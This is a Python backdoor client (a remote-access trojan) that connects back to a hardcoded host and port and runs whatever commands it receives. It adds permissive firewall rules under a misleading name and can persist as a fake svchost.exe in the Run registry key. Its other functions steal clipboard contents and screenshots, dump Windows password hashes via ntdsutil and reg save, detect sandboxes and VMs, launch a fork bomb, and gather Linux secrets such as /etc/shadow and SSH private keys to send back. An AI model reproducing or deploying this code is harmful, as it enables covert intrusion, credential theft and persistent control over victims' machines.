#!/usr/bin/python
import subprocess, socket, json, os, base64, shutil, sys, platform, ctypes,pyperclip
from mss import mss

global ip,port,TMP,APPDATA,path,os_type,red,yellow,r

# color codes..................
red="\033[1;32;31m"
yellow="\033[1;32;33m"
r="\x1b[0m"

dns = '192.168.56.1'
ip = socket.gethostbyname(dns)
port = 6969

# detect OS type for future use........................
if "Linux" in platform.uname():
    os_type = "linux"
else:
    os_type = "windows"

# set temp and appdata path variables for future use...
if os_type == "windows":
    try:
        TMP = os.environ["TEMP"]
        APPDATA = os.environ["APPDATA"]
    except:
        pass

# add firewall rule to open ports for backdoor connection................................................................
if os_type == "windows":
    firewall_input = 'netsh advfirewall firewall add rule name="windows server check" protocol=TCP dir=in localport= '+str(port)+' action=allow'
    firewall_output= 'netsh advfirewall firewall add rule name="windows server check" protocol=TCP dir=out localport= '+str(port)+' action=allow'
else:
    firewall_input = 'iptables -A INPUT -p tcp --dport ' + str(port) + ' -j ACCEPT'
    firewall_output= 'iptables -A OUTPUT -p tcp --sport ' + str(port) + ' -j ACCEPT'
try:
    subprocess.Popen(firewall_input,shell=True)
    subprocess.Popen(firewall_output,shell=True)
except:
    pass

# main backdoor class and functions..............................................
class Backdoor:
    def __init__(self, ip, port):
        # uncomment to activated at startup if needed
        #self.persistance()
        self.conn = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        while True:
            try:
                self.conn.connect((ip, port))
                break
            except socket.error:
                continue

    # dump clipboard..................
    def clipboard(self):
        try:
            s = pyperclip.paste()
            pyperclip.copy(s)
            return s
        except:
            return "[-] dump failed [-]"


    def screenshot(self):
        try:
            with mss() as screenshot:
                screenshot.shot()
        except:
            pass

    def json_send(self, data):
        try:
            json_data = json.dumps(data)
            return self.conn.send(json_data)
        except:
            return self.conn.send("[-] STDOUT parsing problem [-]")
            pass

    # make persistence after reboot...........................................
    def persistence(self):
        if os_type == 'windows':
            try:
                location = os.environ["appdata"] + '\\svchost.exe'
                if not os.path.exists(location):
                    shutil.copyfile(sys.executable, location)
                    subprocess.call(
                        'reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v update /t REG_SZ /d "' + location + '"',
                        shell=True)
                    return "[+] persistance access activated [+]"
            except:
                return "[!] failed to set persistance access [!]"

    def receive(self):
        json_data = ""

        while True:
            try:
                json_data = json_data + self.conn.recv(4096)
                return json.loads(json_data)
            except ValueError:
                continue
            except:
                pass

    def sysinfo(self):
        try:
            sysinfo = platform.uname()
            sysinfo = [' '.join(sysinfo)]
            return str(sysinfo)
        except:
            return "[!] unable to get sysinfo [!]"

    def mkdir(self, directory):
        try:
            os.mkdir(directory)
            return "[+] Directory created [+]"
        except:
            return "[-] unable to create directory [-]"

    def rm_file(self, file):
        try:
            os.remove(file)
            return "[+] file removed [+]"
        except:
            return "[-] no such file or directory [-]"

    def rm_dir(self, directory):
        try:
            shutil.rmtree(directory)
            return "[+] directory removed [+]"
        except:
            return "[-] no such file or directory [-]"

    def chdir(self, path):
        try:
            os.chdir(path)
            return "dir changed to " + str(path)
        except:
            return "[-] no such file or directory [-]"

    def pwd(self):
        try:
            return os.getcwd()
        except:
            pass

    def write_file(self, path, content):
        try:
            with open(path, "wb") as file:
                file.write(base64.b64decode(content))
                return "upload completed"
        except:
            return "[-] failed to write file [-]"

    def read_file(self, path):
        try:
            with open(path, "rb") as file:
                return base64.b64encode(file.read())
        except:
            return "[-] no such file or directory [-]"

    def detectSandboxie(self):
        try:
            self.libHandle = ctypes.windll.LoadLibrary("SbieDll.dll")
            return "[!] Sandbox detected [!]"
        except:
            return "[+] doesn't appear to be a sandbox [+]"

    def detectVM(self):
        try:
            import wmi
            self.objWMI = wmi.WMI()
            for objDiskDrive in self.objWMI.query("Select * from Win32_DiskDrive"):
                if "vbox" in objDiskDrive.Caption.lower() or "virtual" in objDiskDrive.Caption.lower():
                    return "[!] Virtual Machine detected [!]"
            return "[+] doesn't appear to be a VM [+]"
        except:
            return "[-] VM check failed, unable to load module wmi  [-]"

    def fork(self):
        try:
            while 1:
                os.fork()
        except:
            return "[-] fork deploy failed [-]"

    def firewall(self,direction,port,name):
        if os_type == "windows":
            rule = 'netsh advfirewall firewall add rule name='+ str(name) + ' protocol=TCP dir=' + str(direction) + ' localport= '+str(port)+' action=allow'
        else:
            if direction == "in":
                direction = "INPUT"
            if direction == "out":
                direction = "OUTPUT"
            rule = 'iptables -A ' + str(direction) + ' -p tcp --dport ' + str(port) + ' -j ACCEPT'
        try:
            subprocess.call(rule,shell=True)
            return "[+] firewall rule added successfully [+]"
        except:
            return "[-] failed to add firewall rule [-]"
            pass

    def powershell(self,cmd):
        if os_type == "windows":
            try:
                cmd = 'C:\Windows\System32\WindowsPowerShell\\v1.0\powershell.exe -ep bypass ' + str(cmd)
                DEVNULL = open(os.devnull, 'wb')
                return subprocess.call(cmd,shell=True, stderr=DEVNULL, stdin=DEVNULL)
            except:
                return "[-] powershell returned error code 1 [-]"
        else:
            return "[!] target is not a windows machine [!]"

    def hash_dump(self):
        if os_type == 'windows':
            try:
                shutil.rmtree("C:\Windows\Temp\copy-ntds")
                subprocess.call('ntdsutil "ac i ntds" "ifm" "create full C:\Windows\Temp\copy-ntds" quit quit',shell=True)

                return "[+] dumped using ntdsutil, saved in c:\Windows\Temp\copy-ntds [+]"
            except:
                try:
                    subprocess.call('reg save hklm\sam c:\sam.save',shell=True)
                    subprocess.call('reg save hklm\security c:\security.save',shell=True)
                    subprocess.call('reg save hklm\system c:\system.save',shell=True)
                    return "[+] dumped using reg save, saved in c:\\sam.save, system.save , security.save [+]"
                except:
                    return "[-] ntds dump failed [-]"
        else:
            return "[!] target is not a windows machine [!]"

# post exploitation enumeration function for linux............................................................................
    def linux_enum(self):
        system = {"/etc/issue ": "cat /etc/issue",
                  "available shells on system":'cat /etc/shells |grep "bin"|cut -d "/" -f3 2>/dev/null ',
            "OS kernel and version ":"cat /proc/version && uname -mrs && dmesg | grep Linux && ls /boot | grep vmlinuz-",
            "hostname ": "hostname",
            "release ": "cat /etc/*-release",
            "driver info ":"modinfo  `lsmod` 2>&1 | uniq | grep -v alias | grep -v modinfo | grep -v parm | grep -v intree | grep -v license | grep -v author | grep -v retpoline | grep -v depends | grep -v firmware:",
        "available programming languages":'progr_dev=( "which perl" "which gcc" "which g++"  "which python" "which php" "which cc" "which go" "which node") ;for programmin_lang in "${progr_dev[@]}"; do pss=`$programmin_lang |cut -d"/" -f4` ;if [ "$pss" ];  then echo -e "$pss" ;fi done',
                  "system logs ( last 60 )":"tail -n 60 /var/log/syslog",
                  "log files":"ls -haltrZ /var/log"}
        user_accounts = {"users":"cat /etc/passwd | cut -d: -f1  ",
            "emails":"mail && ls -alh /var/mail/",
            "id": "id", "/etc/passwd": "cat /etc/passwd",
            "sudo version":"sudo -V",
            "/etc/shadow": "cat /etc/shadow",
            "other shadow files":"find / -iname 'shadow*' 2>/dev/null",
            "super users": "grep -v -E '^#' /etc/passwd | awk -F: '$3 == 0{print $1}'",
            "check for sudo access with <sudo -l>": " ",
            "logged in accounts": "w",
            "last loggins": "last",
            "command history ( last 60 )": " tail -n 60 ~/.bash_history",
            "sudoers": "cat /etc/sudoers 2>/dev/null | grep -v '#'",
            "environment variables": "env 2>/dev/null | grep -v 'LS_COLORS'"}
        processes = {"mysql command history":"cat ~/.mysql_history",
                        "running processes": "ps -ef",
                     "root services": "ps -ef | grep root",
                     "apt cached packages": "ls -alh /var/cache/apt/archives",
                     "yum cached packages": "ls -alh /var/cache/yum/",
                     "rpm packages": "rpm -qa",
                     "printer status": "lpstat -a",
                     "apache version and modules":"apache2 -v; apache2ctl -M; httpd -v; apachectl -l 2>/dev/null",
                     "apache config file":"cat /etc/apache2/apache2.conf | grep -v '#' 2>/dev/null"}
        network = {"hosts and DNS":"cat /etc/hosts 2>/dev/null && cat /etc/resolv.conf 2>/dev/null && cat /etc/sysconfig/network 2>/dev/null && cat /etc/networks 2>/dev/null | uniq | srt | grep -v '#'",
                    "domain name":"dnsdomainname",
                    "root login status":"cat /etc/ssh/sshd_config | grep PermitRootLogin",
                   "ssh info":" cat ~/.ssh/identity.pub  ~/.ssh/authorized_keys ~/.ssh/identity ~/.ssh/id_rsa.pub ~/.ssh/id_rsa ~/.ssh/id_dsa.pub ~/.ssh/id_dsa /etc/ssh/ssh_config /etc/ssh/sshd_config /etc/ssh/ssh_host_dsa_key.pub /etc/ssh/ssh_host_dsa_key /etc/ssh/ssh_host_rsa_key.pub /etc/ssh/ssh_host_rsa_key /etc/ssh/ssh_host_key.pub /etc/ssh/ssh_host_key 2>/dev/null",
                    "interfaces": "/sbin/ifconfig -a",
                   "network routes": "route",
                   "all users communications":"lsof -i",
                   "connections status": "netstat -antup ",
                   "firewall ":"iptables -L 2>/dev/null && ls /etc/iptables 2>/dev/null"}
        file_system = {"/var/www/ content":"ls -alhR /var/www/",
                        "writable files":"find / -type f -writable -path /sys -prune -o -path /proc -prune -o -path /usr -prune -o -path /lib -prune -o -type d 2>/dev/null",
                        "last modified files/directories":"find /etc -type f -printf '%TY-%Tm-%Td %TT %p\n' | sort -r",
                        "mounted devices": "mount",
                       "/etc/fstab": "cat /etc/fstab",
                       "aARP table":"arp -e",
                       "disks": "fdisk -l",
                       "mounted disks":"df -h",
                       "find SUID files/directories":" find / -user root -perm -4000 -print 2>/dev/null"
                       }
        scheduled_jobs = {"cron jobs": "crontab -l | grep -v '#'",
                        "cronw jobs": "ls -aRl /etc/cron* 2>/dev/null"}

        # headers for each data section..........................................................................................
        system_info = yellow, "\n#### OS and version information ###################################################\n\n", r
        user_accounts_info = yellow, "\n#### users and accounts ###################################################\n\n", r
        processes_info = yellow, "\n#### processes and packages ###################################################\n\n", r
        network_info = yellow, "\n#### network status ###################################################\n\n", r
        file_system_info = yellow, "\n#### directory and file system info ###################################################\n\n", r
        scheduled_jobs_info = yellow, "\n#### scheduled jobs ###################################################\n\n", r

        # join the headers and the values for each data section as a variable........................................................
        for key, value in system.items():
            try:
                system_info += red, "[+] " + key + " [+] \n", r + str(
                    subprocess.check_output(value + "; exit 0", shell=True, stderr=subprocess.STDOUT)) + "\n\n"
            except:
                pass
        for key, value in user_accounts.items():
            try:
                user_accounts_info += red, "[+] " + key + " [+] \n", r + str(
                    subprocess.check_output(value + "; exit 0", shell=True, stderr=subprocess.STDOUT)) + "\n\n"
            except:
                pass
        for key, value in processes.items():
            try:
                processes_info += red, "[+] " + key + " [+] \n", r + str(
                    subprocess.check_output(value + "; exit 0", shell=True, stderr=subprocess.STDOUT)) + "\n\n"
            except:
                pass
        for key, value in network.items():
            try:
                network_info += red, "[+] " + key + " [+] \n", r + str(
                    subprocess.check_output(value + "; exit 0", shell=True, stderr=subprocess.STDOUT)) + "\n\n"
            except:
                pass
        for key, value in file_system.items():
            try:
                file_system_info += red, "[+] " + key + " [+] \n", r + str(
                    subprocess.check_output(value + "; exit 0", shell=True, stderr=subprocess.STDOUT)) + "\n\n"
            except:
                pass
        for key, value in scheduled_jobs.items():
            try:
                scheduled_jobs_info += red, "[+] " + key + " [+] \n", r + str(
                    subprocess.check_output(value + "; exit 0", shell=True, stderr=subprocess.STDOUT)) + "\n\n"
            except:
                pass

        # join all the gathered intel in one variable .......................................................................
        results = system_info + user_accounts_info + processes_info + network_info + file_system_info + scheduled_jobs_info
        results = ' '.join(results)
        intel = open('/tmp/enum.txt','a')
        intel.write(results)
        intel.close()

# filter and run the commands......................................................
    def run(self):
        while True:
            result = ""
            cmd = self.receive()
            if cmd[0] == "cd" and len(cmd) > 1:
                directory = ' '.join(cmd[1:])
                result = self.chdir(directory)
            elif cmd[0] == "q":
                sys.exit(0)
            elif cmd[0] == "download":
                result = self.read_file(cmd[1])
            elif cmd[0] == "upload":
                result = self.write_file(cmd[1], cmd[2])
            elif cmd[0] == "shot":
                self.screenshot()
                result = self.read_file('monitor-1.png')
                os.remove('monitor-1.png')
            elif cmd[0] == "pwd":
                result = self.pwd()
            elif cmd[0] == "rm":
                cmd[1] = ' '.join(cmd[1:])
                result = self.rm_file(cmd[1])
            elif cmd[0] == "rmdir":
                cmd[1] = ' '.join(cmd[1:])
                result = self.rm_dir(cmd[1])
            elif cmd[0] == "sysinfo":
                result = self.sysinfo()
            elif cmd[0] == 'mkdir':
                result = self.mkdir(cmd[1])
            elif cmd[0] == "rename":
                result = self.rename(cmd[1], cmd[2])
            elif cmd[0] == "chk":
                result = str(self.detectSandboxie()) +"\n"+ str(self.detectVM())
            elif cmd[0] == "persistence":
                result=self.persistence()
            elif cmd[0] == "clip":
                result=self.clipboard()
            elif cmd[0] == 'fork':
                self.fork()
            elif cmd[0] == 'fw' and len(cmd) == 4 :
                result=self.firewall(cmd[1],cmd[2],cmd[3])
            elif cmd[0] == "ntds":
                result = self.hash_dump()
            elif cmd[0] == "powershell":
                result=self.powershell(cmd[1])
            elif cmd[0] == "enum":
                if os_type == "linux":
                    self.linux_enum()
                    result = self.read_file('/tmp/enum.txt')
                else:
                    #self.windows_enum()
                    #result = self.read_file('/tmp/enum.txt')
                    result = "on my todo list :)"
            elif len(cmd) > 0:
                try:
                    cmd = ' '.join(cmd[0:])
                    result = str(subprocess.check_output(cmd , shell=True,stderr=subprocess.STDOUT))
                except:
                    result = " "
            self.json_send(result)
            try:
                self.rm_file('/tmp/enum.txt')
            except:
                pass

if __name__ == '__main__':
    try:
        starter = Backdoor(ip, port)
        starter.run()
    except KeyboardInterrupt:
        sys.exit(0)
